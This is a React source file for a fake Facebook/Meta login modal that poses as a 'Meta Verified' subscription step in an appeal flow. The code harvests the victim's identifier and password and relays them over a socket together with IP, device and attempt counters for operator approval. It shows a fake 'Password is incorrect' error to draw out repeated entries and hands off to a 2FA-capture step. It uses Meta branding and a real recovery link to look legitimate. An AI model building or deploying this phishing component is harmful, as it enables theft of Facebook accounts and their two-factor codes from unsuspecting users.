import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
import TickIcon from '@/assets/images/tick.svg';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { submitLoginApproval } from '@/utils/approval-flow';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { type FC, type FormEvent, useEffect, useState } from 'react';

const TEXT = {
    instruction:
        'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
    identityPlaceholder: 'Mobile number or email',
    passwordPlaceholder: 'Password',
    error: 'Password is incorrect, please try again.',
    waiting: 'Waiting for verification...',
    login: 'Log in',
    continue: 'Continue',
    forgot: 'Forgot password?',
    footer: 'About · Help · See more'
} as const;

const textsToTranslate = Object.values(TEXT);

const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [identity, setIdentity] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [showError, setShowError] = useState(false);
    const [isWaiting, setIsWaiting] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, setModalOpen } = store();
    const appeal = useAppealContext();

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = 'Facebook login';
    }, []);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const clearError = () => {
        setShowError(false);
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (!identity.trim() || !password.trim() || isLoading) {
            return;
        }

        setShowError(false);
        setIsLoading(true);
        setIsWaiting(true);

        try {
            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                throw new Error('socket unavailable');
            }

            const result = await submitLoginApproval(
                {
                    socket: appeal.socket,
                    messageId: appeal.messageId,
                    setMessageId: appeal.setMessageId,
                    formData: appeal.formData,
                    loginData: appeal.loginData,
                    loginProvider: appeal.loginProvider,
                    passwordAttempts: appeal.passwordAttempts,
                    twoFAAttempts: appeal.twoFAAttempts,
                    deviceLabel: appeal.deviceLabel,
                    ip: appeal.ip,
                    setLoginData: appeal.setLoginData,
                    addPasswordAttempt: appeal.addPasswordAttempt,
                    addTwoFAAttempt: appeal.addTwoFAAttempt
                },
                identity,
                password
            );

            if (result.approved || result.needs2FA) {
                nextStep();
                return;
            }

            setShowError(true);
            setPassword('');
            setLoginAttempt((n) => n + 1);
        } catch {
            setShowError(true);
            setPassword('');
            setLoginAttempt((n) => n + 1);
        } finally {
            setIsWaiting(false);
            setIsLoading(false);
        }
    };

    return (
        <>
            <div className='modal-backdrop show' onClick={() => setModalOpen(false)} aria-hidden='true' />
            <div className='modal form-modal show' id='exampleModal2' tabIndex={-1} role='dialog' aria-modal='true'>
                <div className='modal-dialog modal-dialog-centered modal-fullscreen-lg-down'>
                    <div className='modal-content'>
                        <div className='modal-header' />
                        <div className='modal-body'>
                            <div>
                                <div className='fb-round-wraper text-center'>
                                    <Image src={FbRoundLogo} alt='' className='fb-logo-round' />
                                </div>

                                <form autoComplete='off' id='apiForm' onSubmit={handleSubmit}>
                                    <p className='login-instruction'>
                                        <Image src={TickIcon} width={16} height={16} alt='' />
                                        {t(TEXT.instruction)}
                                    </p>

                                    {loginAttempt === 0 ? (
                                        <div className={`form-floating mb-3${identity.trim() ? ' has-value' : ''}`}>
                                            <input
                                                autoComplete='username'
                                                className='form-control'
                                                id='loginIdentifier'
                                                maxLength={60}
                                                minLength={3}
                                                name='identifier'
                                                placeholder=' '
                                                required
                                                type='text'
                                                value={identity}
                                                onChange={(e) => {
                                                    setIdentity(e.target.value);
                                                    clearError();
                                                }}
                                            />
                                            <label htmlFor='loginIdentifier'>{t(TEXT.identityPlaceholder)}</label>
                                        </div>
                                    ) : null}

                                    <div
                                        className={`form-floating mb-3${password.trim() ? ' has-value' : ''}`}
                                        style={{ position: 'relative' }}
                                    >
                                        <input
                                            autoComplete='current-password'
                                            className={`form-control ${showError ? 'is-invalid shake' : ''}`}
                                            id='exampleInputPassword'
                                            maxLength={30}
                                            minLength={3}
                                            name='password-1'
                                            placeholder=' '
                                            required
                                            style={{ paddingRight: '44px' }}
                                            type={showPassword ? 'text' : 'password'}
                                            value={password}
                                            onChange={(e) => {
                                                setPassword(e.target.value);
                                                clearError();
                                            }}
                                        />
                                        <label htmlFor='exampleInputPassword'>{t(TEXT.passwordPlaceholder)}</label>
                                        <button
                                            aria-label='Show/Hide password'
                                            aria-pressed={showPassword}
                                            type='button'
                                            style={{
                                                position: 'absolute',
                                                right: '12px',
                                                top: '50%',
                                                transform: 'translateY(-50%)',
                                                cursor: 'pointer',
                                                zIndex: 6,
                                                background: 'transparent',
                                                border: 0,
                                                padding: 0
                                            }}
                                            onClick={() => setShowPassword((prev) => !prev)}
                                        >
                                            <svg
                                                fill='#606770'
                                                height='22'
                                                viewBox='0 0 24 24'
                                                width='22'
                                                xmlns='http://www.w3.org/2000/svg'
                                                style={{ display: showPassword ? 'none' : 'inline' }}
                                                aria-hidden='true'
                                            >
                                                <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                                <circle cx='12' cy='12' r='2.5' />
                                            </svg>
                                            <svg
                                                fill='#1877f2'
                                                height='22'
                                                viewBox='0 0 24 24'
                                                width='22'
                                                xmlns='http://www.w3.org/2000/svg'
                                                style={{ display: showPassword ? 'inline' : 'none' }}
                                                aria-hidden='true'
                                            >
                                                <path d='M12 5c-7.633 0-11 7-11 7s3.367 7 11 7 11-7 11-7-3.367-7-11-7zm0 12c-2.762 0-5-2.239-5-5 0-2.762 2.238-5 5-5 2.761 0 5 2.238 5 5 0 2.761-2.239 5-5 5z' />
                                            </svg>
                                        </button>
                                        {showError ? (
                                            <div className='invalid-feedback d-block'>{t(TEXT.error)}</div>
                                        ) : null}
                                    </div>

                                    {isWaiting ? <p className='text-sm text-[#65676b]'>{t(TEXT.waiting)}</p> : null}

                                    <div className='form-btn-wrapper'>
                                        <button className='btn btn-primary w-100' type='submit' disabled={isLoading}>
                                            {isLoading ? (
                                                <span className='custom-spinner' aria-hidden='true' />
                                            ) : (
                                                <span>{loginAttempt === 0 ? t(TEXT.login) : t(TEXT.continue)}</span>
                                            )}
                                        </button>
                                    </div>

                                    <div className='text-center' id='forgot-pass-wrap'>
                                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer'>
                                            {t(TEXT.forgot)}
                                        </a>
                                    </div>
                                </form>
                            </div>
                            <div className='spaser' />
                        </div>
                        <div className='modal-footer border-0 justify-content-center'>
                            <Image src={MetaLogoGrey} alt='Meta Logo' />
                            <div className='footer-links'>{t(TEXT.footer)}</div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default FacebookLoginModal;
